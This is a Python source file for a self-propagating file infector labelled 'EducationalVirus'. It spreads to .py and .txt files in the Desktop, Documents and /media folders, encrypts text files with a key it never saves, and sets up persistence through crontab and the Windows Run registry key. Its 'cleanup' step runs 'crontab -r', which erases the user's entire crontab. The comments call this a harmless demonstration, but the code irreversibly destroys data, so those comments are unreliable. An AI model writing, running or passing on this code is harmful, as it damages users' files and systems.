import os
import sys
import glob
import hashlib
from cryptography.fernet import Fernet  # pip install cryptography

# Configuration
VIRUS_SIGNATURE = "DEM0_V1RUS_S1GN@TUR3"  # Infection marker
TARGET_EXTENSIONS = ['.py', '.txt']  # File types to infect
MAX_INFECTION_SIZE = 1024 * 1024  # Don't infect files >1MB
PROPAGATION_PATHS = [  # Infection targets
    os.path.expanduser('~/Desktop'),
    os.path.expanduser('~/Documents'),
    '/media'  # USB drives (Linux)
]


class EducationalVirus:
    def __init__(self):
        self.key = Fernet.generate_key()  # For "encryption" demonstration
        self.cipher = Fernet(self.key)
        self.own_hash = self._calculate_hash(__file__)

    def _calculate_hash(self, filepath):
        """Calculate file hash for duplication check"""
        hasher = hashlib.sha256()
        with open(filepath, 'rb') as f:
            hasher.update(f.read())
        return hasher.hexdigest()

    def _infect_file(self, filepath):
        """Infect a single file"""
        try:
            # Skip large files and self
            if (os.path.getsize(filepath) > MAX_INFECTION_SIZE or
                    self._calculate_hash(filepath) == self.own_hash):
                return

            with open(filepath, 'r+') as f:
                content = f.read()
                if VIRUS_SIGNATURE in content:
                    return  # Already infected

                # Prepend virus code to target file
                f.seek(0)
                f.write(f"#{VIRUS_SIGNATURE}\n" + self._get_virus_code())
                f.write(content)

                # Simulate "encryption" for txt files
                if filepath.endswith('.txt'):
                    self._encrypt_file(filepath)

        except Exception as e:
            pass  # Silent failure for demo purposes

    def _get_virus_code(self):
        """Get the current virus code"""
        with open(__file__, 'r') as f:
            code = f.readlines()
        return ''.join(code[code.index('# VIRUS_START\n') + 1:code.index('# VIRUS_END\n')])

    def _encrypt_file(self, filepath):
        """Demonstrate encryption (not real ransomware)"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = self.cipher.encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted)
        except:
            pass

    def propagate(self):
        """Spread to target locations"""
        for path in PROPAGATION_PATHS:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                            self._infect_file(os.path.join(root, file))

    def payload(self):
        """Non-destructive demonstration payload"""
        if os.path.exists(os.path.expanduser('~/virus_demo.txt')):
            return

        with open(os.path.expanduser('~/virus_demo.txt'), 'w') as f:
            f.write("Virus demonstration successful\n")

        # Create visible indicator (for lab observation)
        if os.name == 'posix':
            os.system('echo "Virus Demo Active" > ~/Desktop/WARNING.txt')
        elif os.name == 'nt':
            os.system('echo "Virus Demo Active" > %USERPROFILE%\\Desktop\\WARNING.txt')

    def self_destruct(self):
        """Remove virus from system (lab cleanup)"""
        if os.path.exists(os.path.expanduser('~/ANTIDOTE.txt')):
            os.remove(__file__)
            if os.name == 'posix':
                os.system('crontab -r')
            elif os.name == 'nt':
                os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DemoVirus /f')
            sys.exit(0)


# VIRUS_START
if __name__ == '__main__':
    virus = EducationalVirus()
    virus.self_destruct()  # First check for cleanup
    virus.propagate()
    virus.payload()

    # Persistence mechanism
    if not os.path.exists(sys.argv[0]):
        with open(__file__, 'r') as f:
            code = f.read()
        with open(os.path.join(os.path.dirname(__file__), 'system_service.py'), 'w') as f:
            f.write(code)

    # Scheduled execution (persistence)
    if os.name == 'posix':
        os.system('(crontab -l 2>/dev/null; echo "@daily python3 system_service.py") | crontab -')
    elif os.name == 'nt':
        os.system(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v DemoVirus /t REG_SZ /d "system_service.py"')
# VIRUS_END